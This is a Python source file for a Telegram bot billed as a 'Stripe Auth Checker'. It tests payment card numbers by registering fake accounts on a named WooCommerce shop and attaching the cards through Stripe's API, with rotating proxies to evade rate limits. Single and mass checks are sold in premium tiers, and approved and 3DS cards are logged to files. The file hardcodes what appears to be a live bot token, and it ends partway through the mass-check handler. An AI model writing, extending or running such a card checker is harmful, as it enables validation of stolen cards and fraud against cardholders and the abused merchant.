import telebot, base64, re, time, os, sys, json, threading, hashlib, requests, random, datetime, queue, uuid
from concurrent.futures import ThreadPoolExecutor
from faker import Faker

if sys.platform == 'win32':
    os.system('chcp 65001 > nul')
try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

faker = Faker()

BOT_TOKEN = '8251019841:AAEipH9h9kN7EEC9UmjufnfsBjT0NXwgujk' # Bot Token
ADMIN_ID = [6263030724, 8865545563]
bot = telebot.TeleBot(BOT_TOKEN)

os.makedirs('Data', exist_ok=True)
PREMIUM_FILE = 'Data/premium.txt'
USERS_FILE = 'Data/users.txt'
BANNED_FILE = 'Data/banned.txt'
STATS_FILE = 'stats.json'
APPROVED_FILE = 'Data/approved.txt'
THREEDS_FILE = 'Data/3ds.txt'
PROXY_FILE = "Data/proxies.txt"

ADMIN_LIMIT = 5000
PREMIUM_LIMIT = 1000
FREE_LIMIT = 0
MAX_RETRIES = 3
WORKERS = 12

ACTIVE_JOBS = {}
ACTIVE_USERS_PP = {}
ACTIVE_USERS_MPP = {}
USER_ACTIVE_JOB = {}
STATS_LOCK = threading.Lock()

os.makedirs('Data', exist_ok=True)
for f in [USERS_FILE, PREMIUM_FILE, BANNED_FILE, APPROVED_FILE, THREEDS_FILE]:
    if not os.path.exists(f): open(f, 'w').close()
if not os.path.exists(STATS_FILE):
    with open(STATS_FILE, 'w') as f: json.dump({"approved": 0, "3ds": 0, "premium_users": 0, "banned_users": 0, "total_users": 0}, f)

def get_stats():
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'r') as f: return json.load(f)
        except: return {"approved": 0, "3ds": 0, "premium_users": 0, "banned_users": 0, "total_users": 0}

def save_stats(stats):
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'w') as f: json.dump(stats, f)
        except: pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_premium(user_id):
    with open(PREMIUM_FILE, 'r') as f:
        premiums = f.read().splitlines()
        for p in premiums:
            if str(user_id) in p:
                parts = p.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
                else: return True
    return False

def is_banned(user_id):
    with open(BANNED_FILE, 'r') as f:
        bans = f.read().splitlines()
        for b in bans:
            if str(user_id) in b:
                parts = b.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
                else: return True
    return False

def add_user(user_id):
    with open(USERS_FILE, 'r+') as f:
        users = f.read().splitlines()
        if str(user_id) not in users:
            f.write(str(user_id) + '\n')
            s = get_stats()
            s["total_users"] = len(users) + 1
            save_stats(s)

proxy_list = []
PROXY_QUEUE = queue.Queue()

if os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]
        proxy_list = lines
        for p in lines:
            PROXY_QUEUE.put(p)

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str: return None
    if '@' in proxy_str: return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return proxy_str

def get_proxy_dict():
    if PROXY_QUEUE.empty(): return None, None
    p = PROXY_QUEUE.get()
    fp = format_proxy(p)
    proxy_dict = None
    if not any(p.startswith(proto) for proto in ['http', 'socks']):
        proxy_dict = {"http": f"http://{fp}", "https": f"http://{fp}"}
    else:
        proxy_dict = {"http": fp, "https": fp}
    return proxy_dict, p

def release_proxy(p):
    if p: PROXY_QUEUE.put(p)

def load_proxies():
    global proxy_list
    proxy_list = []
    with PROXY_QUEUE.mutex:
        PROXY_QUEUE.queue.clear()
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
            proxy_list = lines
            for p in lines:
                PROXY_QUEUE.put(p)
    return len(proxy_list)

def save_proxies(proxies):
    with open(PROXY_FILE, 'w') as f:
        for p in proxies:
            f.write(p + '\n')
    load_proxies()

def test_proxy(proxy_str):
    try:
        fp = format_proxy(proxy_str.strip())
        if not fp: return False
        if not any(proxy_str.strip().startswith(proto) for proto in ['http', 'socks']):
            proxy_dict = {"http": f"http://{fp}", "https": f"http://{fp}"}
        else:
            proxy_dict = {"http": fp, "https": fp}
        r = requests.get('http://ip-api.com/json', proxies=proxy_dict, timeout=20)
        return r.status_code == 200
    except:
        return False

def test_proxies_bulk(proxy_list, max_workers=50):
    res = {"working": [], "dead": [], "invalid": []}
    lock = threading.Lock()
    def test_one(p):
        if ':' not in p:
            with lock: res["invalid"].append(p)
            return
        if test_proxy(p):
            with lock: res["working"].append(p)
        else:
            with lock: res["dead"].append(p)
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        ex.map(test_one, proxy_list)
    return res

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)

    text = message.text.strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "𝗨𝘀𝗲: /proxy add/list/test/remove")
        return

    cmd = parts[1].split()[0].lower()
    arg = parts[1][len(cmd):].strip()

    if cmd == 'add':
        proxies_to_add = []
        if arg:
            proxies_to_add = [l.strip() for l in arg.splitlines() if l.strip()]
        elif message.reply_to_message:
            rep = message.reply_to_message
            raw = rep.text or rep.caption or ''
            proxies_to_add = [l.strip() for l in raw.splitlines() if l.strip()]
        if not proxies_to_add:
            bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /proxy add <proxy> 𝗼𝗿 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 𝗳𝗶𝗹𝗲")
            return

        msg = bot.reply_to(message, f"𝗧𝗲𝘀𝘁𝗶𝗻𝗴 {len(proxies_to_add)} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀...")
        res = test_proxies_bulk(proxies_to_add)
        working = res["working"]
        invalid = len(res["invalid"])
        dead = len(res["dead"])

        existing = []
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f:
                existing = [l.strip() for l in f if l.strip()]
        existing_set = set(existing)
        new_working = [p for p in working if p not in existing_set]
        skipped = len(working) - len(new_working)
        save_proxies(existing + new_working)

        result = (
            f"𝗣𝗿𝗼𝘅𝘆 𝗔𝗱𝗱 𝗥𝗲𝘀𝘂𝗹𝘁\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"┣ 𝗧𝗼𝘁𝗮𝗹 ➜ {len(proxies_to_add)}\n"
            f"┣ 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 ➜ {len(working)}\n"
            f"┣ 𝗗𝘂𝗽𝗹𝗶𝗰𝗮𝘁𝗲 ➜ {skipped}\n"
            f"┣ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 ➜ {invalid}\n"
            f"┗ 𝗗𝗲𝗮𝗱 ➜ {dead}"
        )
        try:
            bot.edit_message_text(result, message.chat.id, msg.message_id)
        except:
            bot.reply_to(message, result)

    elif cmd == 'remove':
        if not arg:
            bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /proxy remove <index/all>")
            return
        if not os.path.exists(PROXY_FILE):
            bot.reply_to(message, "𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱")
            return
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if arg == 'all':
            save_proxies([])
            bot.reply_to(message, "𝗔𝗹𝗹 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗿𝗲𝗺𝗼𝘃𝗲𝗱")
            return
        try:
            idx = int(arg)
            if idx < 1 or idx > len(proxies):
                bot.reply_to(message, f"𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗱𝗲𝘅. 𝗧𝗼𝘁𝗮𝗹: {len(proxies)}")
                return
            removed = proxies.pop(idx - 1)
            save_proxies(proxies)
            bot.reply_to(message, f"𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ➜ {removed}\n┗ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 ➜ {len(proxies)}")
        except ValueError:
            bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /proxy remove <index/all>")

    elif cmd == 'list':
        if not os.path.exists(PROXY_FILE):
            bot.reply_to(message, "𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱")
            return
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if not proxies:
            bot.reply_to(message, "𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱")
            return
        lines = [f"𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(proxies)})"]
        lines.append("━━━━━━━━━━━━━━━━━━━━")
        for i, p in enumerate(proxies, 1):
            masked = p[:20] + '...' if len(p) > 23 else p
            lines.append(f"┣ {i}. {masked}")
        if len(proxies) > 50:
            lines = lines[:50] + [f"┗ ... 𝗮𝗻𝗱 {len(proxies) - 50} 𝗺𝗼𝗿𝗲"]
        else:
            lines[-1] = lines[-1].replace('┣', '┗')
        bot.reply_to(message, "\n".join(lines))

    elif cmd == 'test':
        if not os.path.exists(PROXY_FILE):
            bot.reply_to(message, "𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱")
            return
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if not proxies:
            bot.reply_to(message, "𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱")
            return

        msg = bot.reply_to(message, f"𝗧𝗲𝘀𝘁𝗶𝗻𝗴 {len(proxies)} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀...")
        res = test_proxies_bulk(proxies)
        working = res["working"]
        dead = len(res["dead"])
        save_proxies(working)
        result = (
            f"𝗣𝗿𝗼𝘅𝘆 𝗧𝗲𝘀𝘁 𝗥𝗲𝘀𝘂𝗹𝘁\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"┣ 𝗧𝗲𝘀𝘁𝗲𝗱 ➜ {len(proxies)}\n"
            f"┣ 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 ➜ {len(working)}\n"
            f"┗ 𝗗𝗲𝗮𝗱 ➜ {dead}"
        )
        try:
            bot.edit_message_text(result, message.chat.id, msg.message_id)
        except:
            bot.reply_to(message, result)

    else:
        bot.reply_to(message, f"𝗨𝗻𝗸𝗻𝗼𝘄𝗻 𝗰𝗼𝗺𝗺𝗮𝗻𝗱: /proxy {cmd}")

def _clean_msg(msg):
    """Strip leading 'Error: ' prefix added by WooCommerce/WCPay."""
    if isinstance(msg, str) and msg.lower().startswith('error: '):
        return msg[7:]
    return msg

def extract_message(response):
    try:
        response_json = response.json()
        if 'message' in response_json: return _clean_msg(response_json['message'])
        if 'data' in response_json:
            data = response_json['data']
            if isinstance(data, dict):
                if 'message' in data: return _clean_msg(data['message'])
                if 'error' in data and isinstance(data['error'], dict):
                    return _clean_msg(data['error'].get('message', str(data['error'])))
        if 'error' in response_json:
            err = response_json['error']
            if isinstance(err, dict): return _clean_msg(err.get('message', str(err)))
            return _clean_msg(str(err))
        for value in response_json.values():
            if isinstance(value, dict) and 'message' in value: return _clean_msg(value['message'])
        return f"Message not found. Status: {response.status_code}"
    except:
        if "so soon" in response.text.lower() or "too many" in response.text.lower():
            return "Rate Limit"
        match = re.search(r'"message":"(.*?)"', response.text)
        if match: return _clean_msg(match.group(1))
        return "Unknown error"

GATEWAYS = [
    {
        "name": "Dila Boards",
        "url": "https://dilaboards.com/en/moj-racun/add-payment-method/",
        "ajax_url": "https://dilaboards.com/en/",
    }
]

def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', 'UNKNOWN')
            country = data.get('country_name', 'UNKNOWN')
            brand = data.get('brand', 'UNKNOWN')
            level = data.get('level', 'N/A')
            type_cc = data.get('type', 'N/A')
            flag = data.get('country_flag', '')
            return brand, bank, country, level, type_cc, flag
    except: pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A", ""

def fmt(code):
    return str(code)

def check_cc(cc_full, proxy=None):
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    try:
        data_parts = cc_full.strip().split('|')
        cc, mm, yy, cvv = data_parts[0], data_parts[1], data_parts[2], data_parts[3].replace('.', '')
    except:
        return "ERROR", "Invalid format", "UNKNOWN"
    user_ag = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

    for gw in GATEWAYS:
        try:
            current_cookies = gw.get("cookies", {})
            current_nonce = gw.get("nonce", "")
            current_pk = gw.get("stripe_key", "")
            ajax_url = gw["ajax_url"]

            if "dilaboards.com" in gw.get("url", ""):
                try:
                    url_1 = gw["url"]
                    h_pre = {
                        'User-Agent': user_ag, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5', 'Alt-Used': 'dilaboards.com', 'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Priority': 'u=0, i',
                    }
                    r_pre = session.get(url_1, headers=h_pre, timeout=15)
                    reg_nonce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', r_pre.text)[0]
                    current_pk = re.findall('"key":"(.*?)"', r_pre.text)[0]
                    h_reg = {
                        'User-Agent': user_ag, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5', 'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://dilaboards.com', 'Alt-Used': 'dilaboards.com', 'Connection': 'keep-alive',
                        'Referer': url_1, 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Priority': 'u=0, i',
                    }
                    reg_data = {
                        'email': faker.email(domain="gmail.com"),
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': url_1,
                        'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'wc_order_attribution_session_pages': '2',
                        'wc_order_attribution_session_count': '1',
                        'wc_order_attribution_user_agent': user_ag,
                        'woocommerce-register-nonce': reg_nonce,
                        '_wp_http_referer': '/en/moj-racun/add-payment-method/',
                        'register': 'Register',
                    }
                    r_reg = session.post(url_1, headers=h_reg, data=reg_data, timeout=15)
                    if "so soon" in r_reg.text.lower() or "too many" in r_reg.text.lower():
                        return "ERROR", "Rate Limit", "UNKNOWN"
                    current_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', r_reg.text)[0]
                except:
                    return "ERROR", "Registration Failed", "UNKNOWN"
            else:
                for k, v in current_cookies.items():
                    session.cookies.set(k, v)

            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
            ele_id = f"src_{random.getrandbits(128):032x}"
            h1 = {
                'User-Agent': user_ag, 'Accept': 'application/json', 'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://js.stripe.com',
            }
            d1 = {
                'type': 'card', 'card[number]': cc, 'card[cvc]': cvv, 'card[exp_year]': yy, 'card[exp_month]': mm,
                'allow_redisplay': 'unspecified', 'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
                'billing_details[address][country]': 'US',
                'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
                'referrer': gw.get("url", ajax_url), 'time_on_page': str(random.randint(10000, 99999)),
                'client_attribution_metadata[client_session_id]': ele_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': ele_id,
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid, 'muid': muid, 'sid': sid, 'key': current_pk, '_stripe_version': '2024-06-20',
            }
            r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=h1, data=d1, timeout=15)
            res1 = r1.json()
            if "error" in res1:
                msg = res1["error"].get("message", "Declined")
                if "security code is" in msg.lower():
                    return "DECLINED", msg, res1.get("card", {}).get("brand", "UNKNOWN")
                continue
            pm_id = res1["id"]
            brand = res1.get("card", {}).get("brand", "UNKNOWN")
            h2 = {
                'User-Agent': user_ag, 'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest', 'Referer': gw.get("url", ajax_url),
            }
            d2 = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': current_nonce,
            }
            final_ajax_url = f"{ajax_url}?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            r2 = session.post(final_ajax_url, headers=h2, data=d2, timeout=20)
            if r2.status_code == 429: continue
            res2 = r2.json()
            success = res2.get('success', False)
            status_val = res2.get('data', {}).get('status', 'unknown')
            if success or status_val == 'succeeded':
                return "APPROVED", "Payment method added successfully.", brand
            msg = extract_message(r2)
            if "so soon" in msg.lower() or "too many" in msg.lower():
                return "ERROR", "Rate Limit", brand
            if "security code is" in msg.lower():
                return "DECLINED", msg, brand
            if "requires_action" in msg.lower() or "require_action" in msg.lower():
                return "3DS", "3DS", brand
            if "card was declined" in msg.lower() or "card number is incorrect" in msg.lower() or "security code is invalid" in msg.lower():
                return "DECLINED", msg, brand
            return "DECLINED", msg, brand
        except Exception as e:
            continue
    return "ERROR", "Gateway Rate Limited", "UNKNOWN"

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)
    fname = message.from_user.first_name

    greet = f"𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗖𝗵𝗲𝗰𝗸𝗲𝗿."
    user_cmds = """⋆ 𝗨𝘀𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
  · /st  ━ 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸
  · /mst  ━ 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸
  · /proxy add  ━ 𝗔𝗱𝗱 𝗣𝗿𝗼𝘅𝘆
  · /proxy list  ━ 𝗟𝗶𝘀𝘁 𝗣𝗿𝗼𝘅𝗶𝗲𝘀
  · /proxy test  ━ 𝗧𝗲𝘀𝘁 𝗣𝗿𝗼𝘅𝗶𝗲𝘀
  · /proxy remove  ━ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗼𝘅𝘆
  · /info  ━ 𝗠𝘆 𝗜𝗻𝗳𝗼"""
    admin_cmds = """⋆ 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
  · /addpremium  ━ 𝗔𝗱𝗱 𝗣𝗿𝗲𝗺𝗶𝘂𝗺
  · /rmpremium  ━ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗲𝗺𝗶𝘂𝗺
  · /ban  ━ 𝗕𝗮𝗻 𝗨𝘀𝗲𝗿
  · /unban  ━ 𝗨𝗻𝗯𝗮𝗻 𝗨𝘀𝗲𝗿
  · /stats  ━ 𝗕𝗼𝘁 𝗦𝘁𝗮𝘁𝘀"""
    footer = "𝗗𝗲𝘃: @noxxwraith"

    if is_admin(user_id):
        menu = f"""{greet}
━━━━━━━━━━━━━━━━━
{user_cmds}

{admin_cmds}
━━━━━━━━━━━━━━━━━
{footer}"""
    elif is_premium(user_id):
        menu = f"""{greet}
━━━━━━━━━━━━━━━━━
{user_cmds}
━━━━━━━━━━━━━━━━━
{footer}"""
    else:
        if FREE_LIMIT == 0:
            free_mst = "  · /mst  ━ 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 (𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗢𝗻𝗹𝘆)"
            user_cmds_free = f"""⋆ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
  · /st  ━ 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸
{free_mst}
  · /proxy add  ━ 𝗔𝗱𝗱 𝗣𝗿𝗼𝘅𝘆
  · /proxy list  ━ 𝗟𝗶𝘀𝘁 𝗣𝗿𝗼𝘅𝗶𝗲𝘀
  · /proxy test  ━ 𝗧𝗲𝘀𝘁 𝗣𝗿𝗼𝘅𝗶𝗲𝘀
  · /proxy remove  ━ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗼𝘅𝘆
  · /info  ━ 𝗠𝘆 𝗜𝗻𝗳𝗼"""
        else:
            user_cmds_free = f"""⋆ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
  · /st  ━ 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸
  · /mst  ━ 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸
  · /proxy add  ━ 𝗔𝗱𝗱 𝗣𝗿𝗼𝘅𝘆
  · /proxy list  ━ 𝗟𝗶𝘀𝘁 𝗣𝗿𝗼𝘅𝗶𝗲𝘀
  · /proxy test  ━ 𝗧𝗲𝘀𝘁 𝗣𝗿𝗼𝘅𝗶𝗲𝘀
  · /proxy remove  ━ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗼𝘅𝘆
  · /info  ━ 𝗠𝘆 𝗜𝗻𝗳𝗼"""
        menu = f"""{greet}
━━━━━━━━━━━━━━━━━
{user_cmds_free}
━━━━━━━━━━━━━━━━━
{footer}"""

    bot.reply_to(message, menu)


@bot.message_handler(commands=['st'])
def b3(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)
    
    if ACTIVE_USERS_PP.get(user_id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮 𝘀𝗶𝗻𝗴𝗹𝗲 𝗰𝗵𝗲𝗰𝗸 𝗿𝘂𝗻𝗻𝗶𝗻𝗴! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁.")
        return
    
    if not proxy_list:
        bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝗮𝗱𝗱 𝗽𝗿𝗼𝘅𝘆 𝗳𝗶𝗿𝘀𝘁")
        return
        
    cc = None
    if len(message.text.split()) > 1:
        cc = message.text.split()[1].split('#')[0].strip()
    elif message.reply_to_message:
        target_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        match = re.search(r'(\d{15,16})[|](\d{2})[|](\d{2,4})[|](\d{3,4})', target_text)
        if match:
            cc = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
            
    if not cc:
        usage_msg = "𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /𝙨𝙩 4111...|12|25|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝗖𝗖 𝙞𝙣𝙛𝙤"
        bot.reply_to(message, usage_msg)
        return
    
    ACTIVE_USERS_PP[user_id] = True
    msg = bot.reply_to(message, "𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭...")
    
    bin_code = cc[:6]
    brand_bin, bank, country, level, type_cc, flag = get_bin_info(bin_code)
    
    for _ in range(MAX_RETRIES):
        proxy_dict = None
        p_raw = None
        proxy_dict, p_raw = get_proxy_dict()
            
        try:
            status, response, brand_auto = check_cc(cc, proxy_dict)
            if status != "ERROR":
                break
        finally:
            release_proxy(p_raw)
            
    response = fmt(response)
    brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
    safe_response = str(response).replace("<", "").replace(">", "").replace("&", "")
    
    if status == "APPROVED":
        status_font = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
        s = get_stats(); s["approved"] += 1; save_stats(s)
        with open(APPROVED_FILE, 'a', encoding="utf-8") as f: f.write(f"{cc} - {response}\n")
    elif status == "3DS":
        status_font = "𝟯𝗗𝗦 ❎"
        s = get_stats(); s["3ds"] += 1; save_stats(s)
        with open(THREEDS_FILE, 'a', encoding="utf-8") as f: f.write(f"{cc} - {response}\n")
    elif status == "DECLINED":
        status_font = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"
    else:
        status_font = "𝗘𝗥𝗥𝗢𝗥"

    if is_admin(user_id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
    elif is_premium(user_id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
    else: is_p = " [𝗙𝗥𝗘𝗘]"
    
    safe_fname = str(message.from_user.first_name).replace("<", "").replace(">", "").replace("&", "")
    safe_bank = str(bank).replace("<", "").replace(">", "").replace("&", "")
    safe_brand = str(brand).replace("<", "").replace(">", "").replace("&", "")
    
    res = f"""{status_font}
━━━━━━━━━━━━━━━━━
𝗖𝗮𝗿𝗱 ━ <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ━ {safe_response}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ━ Stripe Auth
━━━━━━━━━━━━━━━━━
𝗕𝗜𝗡: {safe_brand} | {type_cc} | {level}
𝗕𝗮𝗻𝗸: {safe_bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}
━━━━━━━━━━━━━━━━━
𝗨𝘀𝗲𝗿: {safe_fname}{is_p}
𝗗𝗲𝘃: @noxxwraith"""
    try: bot.delete_message(message.chat.id, msg.message_id)
    except: pass
    
    try: bot.reply_to(message, res, parse_mode="HTML")
    except Exception as e:
        print("[!] Final Msg HTML error: ", e)
        try: bot.reply_to(message, res.replace("<code>", "").replace("</code>", ""))
        except: pass
        
    ACTIVE_USERS_PP[user_id] = False

@bot.message_handler(commands=['mst'])
def mb3(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)
    
    if ACTIVE_USERS_MPP.get(user_id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮 𝗺𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸 𝗿𝘂𝗻𝗻𝗶𝗻𝗴! 𝗣𝗹𝗲𝗮𝘀𝗲 /𝘀𝘁𝗼𝗽 𝗶𝘁 𝗳𝗶𝗿𝘀𝘁.")
        return
    
    if not proxy_list:
        bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝗮𝗱𝗱 𝗽𝗿𝗼𝘅𝘆 𝗳𝗶𝗿𝘀𝘁")
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 /mst")
        return
    
